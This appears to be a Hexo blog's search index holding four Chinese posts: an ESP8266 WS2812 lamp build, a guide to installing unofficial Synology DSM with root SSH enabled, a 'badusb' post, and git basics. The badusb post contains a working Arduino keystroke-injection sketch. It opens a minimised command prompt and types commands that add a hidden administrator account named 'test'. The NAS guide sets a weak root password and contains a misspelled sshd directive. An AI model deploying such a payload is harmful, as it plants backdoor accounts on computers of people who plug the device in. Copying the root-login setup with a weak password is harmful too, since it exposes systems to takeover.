<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>esp8266-ws2812氛围灯</title>
      <link href="p/ws2812.html"/>
      <url>p/ws2812.html</url>
      
        <content type="html"><![CDATA[<h2 id="硬件及硬件接线图"><a href="#硬件及硬件接线图" class="headerlink" title="硬件及硬件接线图"></a>硬件及硬件接线图</h2><h5 id="硬件列表"><a href="#硬件列表" class="headerlink" title="硬件列表:"></a>硬件列表:</h5><blockquote><p>ESP8266 NodeMCU</p><p>WS2812灯带</p><p>杜邦线(母对公)3条</p></blockquote><h5 id="接线图"><a href="#接线图" class="headerlink" title="接线图"></a>接线图</h5><img src="./medias/detail/load.gif" data-original="https://image.zhoyolg.com/ws2812-esp8266/esp82661.png" style="zoom:60%;"><h2 id="Arduino-配置"><a href="#Arduino-配置" class="headerlink" title="Arduino 配置"></a>Arduino 配置</h2><h3 id="1-搭建-ESP8266-开发环境"><a href="#1-搭建-ESP8266-开发环境" class="headerlink" title="1. 搭建 ESP8266 开发环境"></a>1. 搭建 ESP8266 开发环境</h3><ol><li><p>下载 Arduino 并安装，下载地址：<a href="https://www.arduino.cc/en/Main/Software">https://www.arduino.cc/en/Main/Software</a> ;</p></li><li><p>打开 Arduino ，单击菜单栏的 <strong>文件</strong> -&gt; <strong>首选项</strong> ，在 <strong>“附加开发板管理器网址”</strong> 中输入 “<a href="http://arduino.esp8266.com/stable/package_esp8266com_index.json&quot;">http://arduino.esp8266.com/stable/package_esp8266com_index.json"</a> ；</p><img src="./medias/detail/load.gif" data-original="https://image.zhoyolg.com/ws2812-esp8266/esp82662.png" style="zoom:80%;"></li><li><p>单击菜单栏的的 <strong>工具</strong> -&gt; <strong>开发板</strong> -&gt; <strong>开发板管理器</strong> ，在搜索框中输入 “<strong>ESP8266</strong>“ ，选择版本后安装；</p><img src="./medias/detail/load.gif" data-original="https://image.zhoyolg.com/ws2812-esp8266/esp82663.png" style="zoom:83%;"></li></ol><h3 id="2-安装-blinker-Arduino-库"><a href="#2-安装-blinker-Arduino-库" class="headerlink" title="2. 安装 blinker Arduino 库"></a>2. 安装 blinker Arduino 库</h3><ol><li>点击 <a href="https://github.com/blinker-iot/blinker-library/archive/master.zip">下载blinker Arduino库</a> ；</li><li>将下载好的blinker库解压到 <strong>我的电脑</strong> &gt; <strong>文档</strong> &gt; <strong>Arduino</strong> &gt; <strong>libraries</strong> 文件夹中；</li></ol><h3 id="3-安装-Adafruit-NeoPixel-库"><a href="#3-安装-Adafruit-NeoPixel-库" class="headerlink" title="3. 安装 Adafruit_NeoPixel 库"></a>3. 安装 Adafruit_NeoPixel 库</h3><ol><li><p>Github地址：<a href="https://github.com/adafruit/Adafruit_NeoPixel/releases">Releases page</a>；</p></li><li><p>将下载好的Adafruit NeoPixel库解压到 <strong>我的电脑</strong> &gt; <strong>文档</strong> &gt; <strong>Arduino</strong> &gt; <strong>libraries</strong> 文件夹中；</p></li></ol><img src="./medias/detail/load.gif" data-original="https://image.zhoyolg.com/ws2812-esp8266/esp82666.png" style="zoom:55%;"><h3 id="4-安装-FASTLED库"><a href="#4-安装-FASTLED库" class="headerlink" title="4. 安装 FASTLED库"></a>4. 安装 FASTLED库</h3><ol><li><strong>项目</strong>&gt;<strong>加载库</strong>&gt;<strong>管理库</strong>&gt;<strong>fastled安装</strong></li></ol><img src="./medias/detail/load.gif" data-original="https://image.zhoyolg.com/ws2812-esp8266/esp82664.png" style="zoom:80%;"><h3 id="5-在App中添加设备，获取-Secret-Key"><a href="#5-在App中添加设备，获取-Secret-Key" class="headerlink" title="5.在App中添加设备，获取 Secret Key"></a>5.在App中添加设备，获取 <code>Secret Key</code></h3><ol><li>进入<code>点灯 blinker</code>App，点击右上角的 “**+**“ 号，然后选择 <strong>添加设备</strong>；</li><li>点击选择 <code>Arduino</code> &gt; <code>WiFi接入</code>；</li><li>选择要接入的服务商，选阿里云;</li><li>复制申请到的 <code>Secret Key</code>；</li></ol><h3 id="6-编写-Arduino-程序"><a href="#6-编写-Arduino-程序" class="headerlink" title="6.编写 Arduino 程序"></a>6.编写 <code>Arduino</code> 程序</h3><h3 id="7-编码"><a href="#7-编码" class="headerlink" title="7.编码"></a>7.编码</h3><p>打开 <code>Arduino</code> ，使用以下代码；</p><p><a href="https://fireworks.lanzoui.com/iLHboqkh54h">代码链接</a></p><p>修改源码中 <code>auth[]</code> 的值为在App中获取到的 <code>Secret Key</code> ，修改<code> ssid[]</code> 的值为<code> WiFi</code> 名称，修改<code> pswd[]</code> 的值为<code> WiFi</code> 密码，其他配置可根据自身条件设置。</p><h3 id="8-上传至-ESP8266"><a href="#8-上传至-ESP8266" class="headerlink" title="8.上传至 ESP8266"></a>8.上传至 <code>ESP8266</code></h3><p>修改源码相关配置后，单击 <code>Arduino</code> 的 <code>上传</code> 按钮上传代码至 <code>ESP8266</code>；</p><h3 id="9-设备配置"><a href="#9-设备配置" class="headerlink" title="9.设备配置"></a>9.设备配置</h3><ol><li><p>打开 <code>点灯 blinker</code> App 主页，可看到设备已在线，点击设备进入配置页面；</p></li><li><p>点击设备 <code>编辑</code> 按钮；</p></li><li><p>点击页右上方<strong>三点</strong>&gt;<strong>界面配置</strong>&gt;将压缩包内txt配置文件复制到配置文件即可;</p></li></ol><img src="./medias/detail/load.gif" data-original="https://image.zhoyolg.com/ws2812-esp8266/esp82665.png" style="zoom:30%;">]]></content>
      
      
      <categories>
          
          <category> esp8266 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> esp8266 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>黑群晖入门</title>
      <link href="p/ds918.html"/>
      <url>p/ds918.html</url>
      
        <content type="html"><![CDATA[<h3 id="黑群晖最新引导系统"><a href="#黑群晖最新引导系统" class="headerlink" title="黑群晖最新引导系统"></a>黑群晖最新引导系统</h3><h4 id="前提条件"><a href="#前提条件" class="headerlink" title="前提条件"></a>前提条件</h4><p>PE启动盘 下面是我推荐两个pe</p><p><a href="http://www.wepe.com.cn/">微PE</a></p><p><a href="https://www.upe.net/">优启通</a></p><p>开始前先拔掉所有硬盘，以防写错盘导致数据丢失</p><h5 id="群晖写盘软件及引导文件"><a href="#群晖写盘软件及引导文件" class="headerlink" title="群晖写盘软件及引导文件"></a>群晖写盘软件及引导文件</h5><p>这里只有DS918的引导，其他的自行搜索</p><p><a href="https://fireworks.lanzoui.com/b00obyq9a">DS918+引导文件下载</a> 提取密码:8mmj</p><h4 id="开始"><a href="#开始" class="headerlink" title="开始"></a>开始</h4><p>插上u盘 开机自检页面按F11或F7 (机型不同快捷按键也不同)，选择u盘启动</p><img src="./medias/detail/load.gif" data-original="https://www.helloimg.com/images/2021/02/25/Bv4gnX.png"><p>PE桌面找到 分区工具<a href="http://www.diskgenius.cn/download.php">DiskGenius</a></p><img src="./medias/detail/load.gif" data-original="https://www.helloimg.com/images/2021/02/25/Bv4VBM.png"><p>点选 第一个硬盘 即便是内置的16G硬盘</p><img src="./medias/detail/load.gif" data-original="https://www.helloimg.com/images/2021/02/25/Bv4YtP.png"><p>删除所有分区，保存</p><img src="./medias/detail/load.gif" data-original="https://www.helloimg.com/images/2021/02/25/Bv4fv6.png"><p>打开写盘工具，选择群晖引导镜像，然后点右下角的Start 按钮开始写入</p><img src="./medias/detail/load.gif" data-original="https://www.helloimg.com/images/2021/02/25/Bv4kzg.png"><p>此刻就写入完成了，拔掉U盘重启系统即可。</p><p><strong>如果已经安装过系统，那开机后 群晖助手会提示 系统可恢复 直接点恢复即可，不会损坏数据。</strong></p><h4 id="群晖添加第三方源"><a href="#群晖添加第三方源" class="headerlink" title="群晖添加第三方源"></a><strong>群晖</strong>添加第三方源</h4><ul><li>群晖环境：群晖DS3617xs 版本：DSM 6.1.7-15284 Update 2</li><li>(管理员账号)进入DSM桌面，打开“套件中心”，点击“设置” —&gt; “常规”，选择“任何发行者”</li></ul><h5 id="第三方源网址"><a href="#第三方源网址" class="headerlink" title="第三方源网址"></a><code>第三方源网址</code></h5><ul><li><a href="http://packages.synocommunity.com/">http://packages.synocommunity.com</a>        <code>（建议选择这个，支持HTTPS）</code></li><li><a href="http://packages.pcloadletter.co.uk/">http://packages.pcloadletter.co.uk</a></li><li><a href="http://www.cphub.net/">http://www.cphub.net</a></li><li><a href="http://synology.sysco.ch/">http://synology.sysco.ch</a></li><li><a href="http://packages.quadrat4.de/">http://packages.quadrat4.de</a></li><li><a href="http://synology.acmenet.ru/">http://synology.acmenet.ru</a></li><li><a href="http://cytec.us/spk">http://cytec.us/spk</a></li><li><a href="http://spk.naefmarco.ch/spkrepo/packages/">http://spk.naefmarco.ch/spkrepo/packages/</a></li><li><a href="http://spk.nas-mirror.de/spkrepo/packages">http://spk.nas-mirror.de/spkrepo/packages</a></li><li><a href="http://spk.unzureichende.info/">http://spk.unzureichende.info/</a></li><li><a href="http://packages.synocommunity.com/?beta=1">http://packages.synocommunity.com/?beta=1</a></li></ul><p><strong>刷新“套件中心”，找到“社群”。这个就是第三方源</strong></p><h4 id="开启root权限登录"><a href="#开启root权限登录" class="headerlink" title="开启root权限登录"></a>开启root权限登录</h4><ul><li><h5 id="DSM开启SSH"><a href="#DSM开启SSH" class="headerlink" title="DSM开启SSH"></a>DSM开启SSH</h5></li></ul><p>​       DSM的控制面板-终端机和SNMP，勾上启动Telnet功能和启动SSH功能</p><ul><li><h5 id="SSH登录群晖"><a href="#SSH登录群晖" class="headerlink" title="SSH登录群晖"></a>SSH登录群晖</h5><p>输入sudo -i 切换到root环境下<code>(跟ssh密码一样)</code></p><p>输入命令</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">cd</span> /etc/ssh/ 回车<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>继续输入</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">chmod</span> <span class="token number">755</span> sshd_config 回车赋予权限<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>vim   sshd_config 修改config文件</p><p>输入i编辑</p><p>找到这一行：#PermitRootLogin prohibit password </p><p>修改为</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">PermirtRootLogin <span class="token function">yes</span> 删除<span class="token comment">#号 </span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>按一下键盘ESC退出编辑模式</p><p>再输入:wq回车保存</p><h5 id="下一步修改root密码，不然无法使用root登录"><a href="#下一步修改root密码，不然无法使用root登录" class="headerlink" title="下一步修改root密码，不然无法使用root登录"></a>下一步修改root密码，不然无法使用root登录</h5><p>输入下面命令修改root默认密码</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">synouser --setpw root <span class="token number">123456</span> <span class="token punctuation">(</span>后面数字替换密码<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>reboot重启群晖</p><p>重启后即可以root登录群晖</p></li></ul><p><strong>资料教程大全打包下载，蜗牛星际NAS 黑群晖系统通用教材</strong></p><p><a href="https://pan.baidu.com/s/1QuS27ILEMCCUDHWUAsFwwA">百度网盘</a> 提取码：6f91</p>]]></content>
      
      
      <categories>
          
          <category> 硬件 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> nas </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>badusb-代码</title>
      <link href="p/badusb.html"/>
      <url>p/badusb.html</url>
      
        <content type="html"><![CDATA[<h4 id="badusb代码介绍及分享"><a href="#badusb代码介绍及分享" class="headerlink" title="badusb代码介绍及分享"></a>badusb代码介绍及分享</h4><p>建议先在虚拟机测试，有些badusb恶意代码会使你的电脑系统受损，badusb对linux系统无效，如将badusb循环执行 Alt +F4 关闭窗口则无法在windows烧写，这时候就可以使用Linux版的Arduino进行烧写（树莓派等）。更多badusb代码可上<a href="https://github.com/">github</a> 查看</p><p><a href="https://www.arduino.cc/en/software">编写软件</a></p><h4 id="添加用户示例代码："><a href="#添加用户示例代码：" class="headerlink" title="添加用户示例代码："></a>添加用户示例代码：</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment">#include &lt;Keyboard.h&gt;</span>void <span class="token function-name function">setup</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  // 这里执行一次  Keyboard.begin<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>//开始键盘通讯   delay<span class="token punctuation">(</span><span class="token number">2000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>//初始化时间  Keyboard.press<span class="token punctuation">(</span>KEY_LEFT_GUI<span class="token punctuation">)</span><span class="token punctuation">;</span> //点击win键  delay<span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">;</span> //延迟执行时间  Keyboard.press<span class="token punctuation">(</span><span class="token string">'r'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> //点击r键  delay<span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  Keyboard.release<span class="token punctuation">(</span>KEY_LEFT_GUI<span class="token punctuation">)</span><span class="token punctuation">;</span> //释放win键  Keyboard.release<span class="token punctuation">(</span><span class="token string">'r'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> //释放r键  delay<span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  Keyboard.println<span class="token punctuation">(</span><span class="token string">"cmd.exe /T:01 /K mode CON: COLS=16 LINES=1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> //打开cmd并将串口最小化  delay<span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  Keyboard.press<span class="token punctuation">(</span>KEY_RETURN<span class="token punctuation">)</span><span class="token punctuation">;</span> //回车  Keyboard.release<span class="token punctuation">(</span>KEY_RETURN<span class="token punctuation">)</span><span class="token punctuation">;</span> //释放回车  delay<span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  Keyboard.println<span class="token punctuation">(</span><span class="token string">"net user test 123456 /add&amp;net localgroup Administrators test /add"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> //添加test用户  delay<span class="token punctuation">(</span><span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  Keyboard.press<span class="token punctuation">(</span>KEY_RETURN<span class="token punctuation">)</span><span class="token punctuation">;</span>  Keyboard.release<span class="token punctuation">(</span>KEY_RETURN<span class="token punctuation">)</span><span class="token punctuation">;</span>  delay<span class="token punctuation">(</span><span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  Keyboard.println<span class="token punctuation">(</span><span class="token string">"exit"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  delay<span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  Keyboard.press<span class="token punctuation">(</span>KEY_RETURN<span class="token punctuation">)</span><span class="token punctuation">;</span>  Keyboard.release<span class="token punctuation">(</span>KEY_RETURN<span class="token punctuation">)</span><span class="token punctuation">;</span>  Keyboard.end<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>//结束键盘通讯 <span class="token punctuation">}</span>  void <span class="token function-name function">loop</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  // 这里循环执行 <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="按键介绍"><a href="#按键介绍" class="headerlink" title="按键介绍"></a>按键介绍</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">delay<span class="token punctuation">(</span><span class="token number">5000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>//延时毫秒 Keyboard.begin<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     //开始键盘通讯Keyboard.end<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     //结束键盘通讯Keyboard.press<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     //按下键盘按键     如果是非特殊按键如 数字、字母按键用单引号括起来Keyboard.release<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     //释放键盘按键Keyboard.println<span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     //输入字符串使用双引号括起来  Mouse.begin<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>//鼠标事件开始Mouse.click<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>//鼠标单击Mouse.end<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>//鼠标事件结束Mouse.move<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>//鼠标移动<span class="token punctuation">(</span>x,y<span class="token punctuation">)</span>Mouse.press<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>//鼠标按下Mouse.release<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>//鼠标松开Mouse.isPressed<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>//   KEY_LEFT_CTRLKEY_LEFT_SHIFTKEY_LEFT_ALTKEY_LEFT_GUI    //win键KEY_RIGHT_CTRLKEY_RIGHT_SHIFTKEY_RIGHT_ALTKEY_RIGHT_GUIKEY_UP_ARROWKEY_DOWN_ARROWKEY_LEFT_ARROWKEY_RIGHT_ARROWKEY_BACKSPACEKEY_TABKEY_RETURN//回车键KEY_ESCKEY_INSERTKEY_DELETEKEY_PAGE_UPKEY_PAGE_DOWNKEY_HOMEKEY_ENDKEY_CAPS_LOCKKEY_F1KEY_F2KEY_F3KEY_F4KEY_F5KEY_F6KEY_F7KEY_F8KEY_F9KEY_F10KEY_F11KEY_F12<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> Blog </category>
          
      </categories>
      
      
        <tags>
            
            <tag> badusb </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>git</title>
      <link href="p/git.html"/>
      <url>p/git.html</url>
      
        <content type="html"><![CDATA[<h3 id="使用Git命令将本地代码提交到github代码仓库"><a href="#使用Git命令将本地代码提交到github代码仓库" class="headerlink" title="使用Git命令将本地代码提交到github代码仓库"></a>使用Git命令将本地代码提交到github代码仓库</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> init//初始化一个空的git仓库<span class="token function">git</span> <span class="token function">add</span> <span class="token builtin class-name">.</span>//将文件夹中所有的文件都提交到暂存区中<span class="token function">git</span> commit -m ‘添加一个描述’//将暂存区的所有文件推到版本库如果你在这里出现了错误，可能是需要添加配置信息，告诉git你是谁<span class="token function">git</span> config --global user.name //你的账户名 <span class="token function">git</span> config --global user.email  //你的邮箱<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="commit命令"><a href="#commit命令" class="headerlink" title="commit命令"></a><strong>commit命令</strong></h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">配置结束后再执行commit命令远程仓库的提交（第一次连接）<span class="token function">git</span> remote <span class="token function">add</span> origin +仓库地址<span class="token function">git</span> push -u origin master （空仓库加 -u）//仓库关联如果无法上传则可以使用强制上传命令代码是 <span class="token function">git</span> push -f origin master强制上传会清空整个仓库<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="分支建立与切换"><a href="#分支建立与切换" class="headerlink" title="分支建立与切换"></a><strong>分支建立与切换</strong></h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> branch main//建立一个名为main的分支<span class="token function">git</span> checkout main//切换到main分支<span class="token function">git</span> branch -D mian//命令则可以来强制删除我们这个分支<span class="token function">git</span> branch//命令来查看我们分支情况<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="hexo生成静态网页"><a href="#hexo生成静态网页" class="headerlink" title="hexo生成静态网页"></a>hexo生成静态网页</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">hexo cl<span class="token operator">&amp;&amp;</span>hexo g<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 命令 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> git </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
